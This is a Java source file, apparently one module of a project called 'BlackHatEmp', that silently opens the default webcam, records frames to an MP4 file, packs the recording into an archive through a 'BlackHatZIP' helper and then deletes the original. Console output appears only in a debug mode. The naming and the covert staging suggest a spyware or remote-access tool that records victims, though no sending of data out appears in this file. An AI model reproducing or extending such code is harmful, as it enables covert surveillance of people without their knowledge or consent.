/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.xuggle.mediatool.IMediaWriter;
import com.xuggle.mediatool.ToolFactory;
import com.xuggle.xuggler.ICodec;
import com.xuggle.xuggler.IPixelFormat;
import com.xuggle.xuggler.IVideoPicture;
import com.xuggle.xuggler.video.ConverterFactory;
import com.xuggle.xuggler.video.IConverter;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import tooles.BlackHatZIP;

/**
 *
 * @author abaza
 */
public class WebcamRecordThreading implements ActionListener {

    File file = null;
    IMediaWriter writer = null;
    Dimension size = null;
    Webcam webcam = null;
    long start = 0;
    static int fram = 0;
    ActionListener MyAction = null;
    BlackHatZIP ZipFile = null;

    public WebcamRecordThreading() {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Start Record Webcam");
        }
        file = new File("output.mp4");
        writer = ToolFactory.makeWriter(file.getName());
        size = WebcamResolution.QVGA.getSize();

        writer.addVideoStream(0, 0, ICodec.ID.CODEC_ID_MPEG1VIDEO, size.width, size.height);

        webcam = Webcam.getDefault();
        webcam.setViewSize(size);
        webcam.open(true);
        ZipFile = new BlackHatZIP();
        start = System.currentTimeMillis();
    }

    public void Stop() {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Stop Record Webcam");
        }

        writer.flush();
        writer.flush();
        if (writer.isOpen()) {
            writer.close();
            writer = null;
        }
        if (webcam.isOpen()) {
            webcam.close();
        }
        if (ZipFile.InsertToZip(file.getAbsolutePath(), 3)) {
            if (file.exists()) {
                file.delete();
                file = null;
            }
        }
    }

    @Override
    public void actionPerformed(ActionEvent ae) {
        if (webcam.isOpen()) {
            BufferedImage image = ConverterFactory.convertToType(webcam.getImage(), BufferedImage.TYPE_3BYTE_BGR);
            IConverter converter = ConverterFactory.createConverter(image, IPixelFormat.Type.YUV420P);

            IVideoPicture frame = converter.toPicture(image, (System.currentTimeMillis() - start) * 1000);
            frame.setKeyFrame(fram == 0);
            frame.setQuality(0);

            writer.encodeVideo(0, frame);
            fram++;
        }
    }

}
